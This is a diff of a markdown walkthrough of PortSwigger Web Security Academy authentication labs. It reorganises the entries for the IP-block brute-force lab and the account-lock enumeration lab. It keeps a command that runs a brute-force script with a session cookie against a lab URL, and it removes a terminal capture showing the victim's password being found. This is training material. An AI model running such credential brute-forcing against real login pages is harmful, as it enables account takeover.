@@ -879,6 +879,9 @@ In this case, merely including your own login credentials at regular intervals t
 
 This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
 
+<details>
+<summary>Lab details, screenshots & walkthrough 0.4</summary>
+
 - Your credentials: `wiener:peter`
 - Victim's username: `carlos`
 - [Candidate Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
@@ -907,8 +910,6 @@ This lab is vulnerable due to a logic flaw in its password brute-force protectio
 **Command:**
 
 ```bash
-cd Penjelajah-CyberSecurity/Port-Swigger/Web-Security-Academy/Authentication-Vulnerabilities/tools
-
 python3 "Broken-brute-force-protection-IP-block.py" \
   --url "https://0a590058035fd606805c807c002400e7.web-security-academy.net/login" \
   --cookie "session=Ka5dUFPztrlMnzFZl1mGG71OGDBp0mfG" \
@@ -916,28 +917,6 @@ python3 "Broken-brute-force-protection-IP-block.py" \
   --victim carlos \
   --passwords passwords.txt \
   --max-fails 2 --delay 0.1
-```
-
-**Output (real terminal capture):**
-
-```text
-$ python3 "Broken-brute-force-protection-IP-block.py" \
-    --url "https://0a590058035fd606805c807c002400e7.web-security-academy.net/login" \
-    --cookie "session=Ka5dUFPztrlMnzFZl1mGG71OGDBp0mfG" \
-    --self-user wiener --self-pass peter \
-    --victim carlos \
-    --passwords passwords.txt \
-    --max-fails 2 --delay 0.1
-
-[*] victim=carlos passwords=100 reset_user=wiener
-[*] 10/100 tried
-[*] 20/100 tried
-[*] 30/100 tried
-[*] 40/100 tried
-[+] HIT carlos:robert status=302 /my-account?id=carlos
-HIT carlos:robert
-
-[exit code: 0]
 ```
 
 **Tool:**
@@ -1169,7 +1148,16 @@ Account locking also fails to protect agains credential stuffing attacks. This i
 
 ##### Lab: Username enumeration via account lock
 
+This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
 
+<details>
+<summary>Lab details, screenshots & walkthrough 0.5</summary>
+
+- Your credentials: `wiener`:`peter`
+- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
+- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+
+</details>
 
 ### User rate limiting
 
